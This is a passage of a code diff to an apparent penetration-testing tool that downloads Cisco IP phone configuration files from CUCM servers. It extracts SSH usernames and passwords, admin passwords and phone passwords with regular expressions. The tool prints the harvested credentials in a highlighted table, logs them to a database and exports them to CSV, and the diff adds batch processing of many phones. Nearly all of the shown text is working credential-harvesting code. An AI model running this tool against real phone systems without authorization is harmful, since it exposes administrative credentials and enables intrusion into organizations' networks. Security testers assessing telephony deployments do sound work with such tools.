+            summary_cucm = list(mac_to_cucm.values())[0] if mac_to_cucm else 'Multiple-CUCM-Servers'
+            
+            # Collect all findings
+            all_found_credentials = []
+            all_found_usernames = []
+            devices_with_creds = {}
+            devices_with_users = {}
+            
+            for mac, content in all_configs:
+                # Search for secrets in this config
+                config_creds = []
+                config_users = []
+                
+                # Track username across the config file
+                user = ''
+                user2 = ''
+                
+                for line in content.split('\n'):
+                    match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
+                    if match:
+                        if match.group(2):
+                            user = match.group(2)
+                            config_users.append((user, f'SEP{mac}'))
+                        if match.group(3):
+                            password = match.group(3)
+                            config_creds.append((user, password, f'SEP{mac}'))
+                        if match.group(4):
+                            user2 = match.group(4)
+                            config_users.append((user2, f'SEP{mac}'))
+                        if match.group(5):
+                            password = match.group(5)
+                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
+                
+                # Track devices with findings
+                if config_creds:
+                    devices_with_creds[f'SEP{mac}'] = config_creds
+                    all_found_credentials.extend(config_creds)
+                
+                if config_users:
+                    devices_with_users[f'SEP{mac}'] = config_users
+                    all_found_usernames.extend(config_users)
+            
+            # Display results
+            if all_found_credentials or all_found_usernames:
+                print(f'\n\n{"="*70}')
+                print(f'{"CREDENTIALS DISCOVERY SUMMARY":^70}')
+                print("="*70)
+                
+                if all_found_credentials:
+                    print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(all_found_credentials)} total)\033[0m')
+                    print("-"*70)
+                    print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
+                    print("-"*70)
+                    for device, creds in devices_with_creds.items():
+                        for cred in creds:
+                            username = cred[0] if cred[0] else 'N/A'
+                            password = cred[1]
+                            print(f'{device:<20} {username:<20} \033[91m{password:<20}\033[0m')
+                
+                if all_found_usernames:
+                    print(f'\n\033[1m[+] USERNAMES FOUND ({len(all_found_usernames)} total)\033[0m')
+                    print("-"*70)
+                    print(f'{"Device":<20} {"Username":<20}')
+                    print("-"*70)
+                    for device, users in devices_with_users.items():
+                        for username in users:
+                            print(f'{device:<20} {username[0]:<20}')
+                
+                print(f'\n{"="*70}')
+                print(f'\n\033[1mSTATISTICS:\033[0m')
+                print(f'  • Total configs downloaded:     {len(all_configs)}')
+                print(f'  • Devices with credentials:     {len(devices_with_creds)}')
+                print(f'  • Devices with usernames only:  {len(devices_with_users)}')
+                print(f'  • Total credentials discovered: {len(all_found_credentials)}')
+                print(f'  • Total usernames discovered:   {len(all_found_usernames)}')
+                if len(mac_to_cucm) > 1:
+                    unique_cucms = set(mac_to_cucm.values())
+                    print(f'  • CUCM servers:                 {", ".join(sorted(unique_cucms))}')
+                print("="*70)
+                
+                # Log to database (unless --no-db)
+                if not no_db:
+                    log_credentials_to_db(summary_cucm, all_found_credentials, all_found_usernames, db_file)
+                
+                # Export to CSV if requested
+                if csv_output:
+                    csv_filename = csv_output if csv_output != True else 'seeyoucm_results.csv'
+                    export_to_csv(all_found_credentials, all_found_usernames, csv_filename)
+            else:
+                print(f'\n\n{"="*70}')
+                print(f'  No credentials or usernames found in {len(all_configs)} configs')
+                print("="*70)
+        else:
+            print('\nNo configuration files found')
+        
+        quit(0)
 
     if enumsubnet:
         hosts = enumerate_phones_subnet(enumsubnet)
@@ -310,7 +1254,7 @@ if __name__ == '__main__':
                 file_names = get_config_names(CUCM_host, hostnames=[host["hostname"]])
                 for file in file_names:
                     print('Connecting to {CUCM_host} and getting config for {host}/{hostname}'.format(CUCM_host=CUCM_host,host=host["ip"],hostname=host["hostname"]))
-                    search_for_secrets(CUCM_host,file)
+                    search_for_secrets(CUCM_host, file, use_tftp)
                 if found_credentials != []:
                     print('Credentials Found in Configurations!')
                 for cred in found_credentials:
@@ -321,16 +1265,50 @@ if __name__ == '__main__':
                     print('{0}\t{1}'.format(usernames[0],usernames[1]))
             print("\n")
         quit(0)
-    elif phone:
-        if args.host is None:
-            CUCM_host = get_cucm_name_from_phone(phone)
-        else:
-            CUCM_host = args.host
-        if CUCM_host is None:
-            print('Unable to automatically detect the CUCM Server. Please specify the CUCM server')
-            quit(1)
-        else:
-            print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
+    elif phones:
+        # Process multiple phones
+        for phone in phones:
+            found_credentials.clear()
+            found_usernames.clear()
+            print(f'\nProcessing phone: {phone}')
+            
+            if args.host is None:
+                CUCM_host = get_cucm_name_from_phone(phone)
+            else:
+                CUCM_host = args.host
+            
+            if CUCM_host is None:
+                print('Unable to automatically detect the CUCM Server for {phone}. Skipping...')
+                continue
+            else:
+                print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
+            
+            # Get hostnames for this phone
+            hostnames = [get_hostname_from_phone(phone)]
+            hostnames += get_phones_hostnames_from_reverse(phone)
+            
+            # Get config files
+            file_names = get_config_names(CUCM_host, hostnames=hostnames)
+            if file_names is None:
+                print('Unable to detect file names from CUCM for {}'.format(phone))
+                continue
+            
+            # Search for secrets
+            for file in file_names:
+                search_for_secrets(CUCM_host, file, use_tftp)
+            
+            # Display results for this phone
+            if found_credentials != []:
+                print('Credentials Found in Configurations!')
+                for cred in found_credentials:
+                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
+            
+            if found_usernames != []:
+                print('Usernames Found in Configurations!')
+                for usernames in found_usernames:
+                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
+        
+        quit(0)
     elif args.host:
         CUCM_host = args.host
     else:
@@ -338,18 +1316,10 @@ if __name__ == '__main__':
         quit(1)
     file_names = get_config_names(CUCM_host)
     if file_names is None:
-        if phone:
-            hostnames = [get_hostname_from_phone(phone)]
-            hostnames += get_phones_hostnames_from_reverse(phone)
+        if phones:
+            hostnames = [get_hostname_from_phone(phones[0])]
+            hostnames += get_phones_hostnames_from_reverse(phones[0])
 
-        if subnet:
-            if hostnames == []:
-                hostnames = get_phones_hostnames_from_reverse(subnet)
-            else:
-                _hostnames = get_phones_hostnames_from_reverse(subnet)
-                if _hostnames:
-                    for host in _hostnames:
-                        hostnames.append(host.rstrip())
         if hostnames == []:
             file_names = get_config_names(CUCM_host)
         else:
@@ -359,7 +1329,7 @@ if __name__ == '__main__':
         print('Unable to detect file names from CUCM')
     else:
         for file in file_names:
-            search_for_secrets(CUCM_host,file)
+            search_for_secrets(CUCM_host, file, use_tftp)
 
     if found_credentials != []:
         print('Credentials Found in Configurations!')
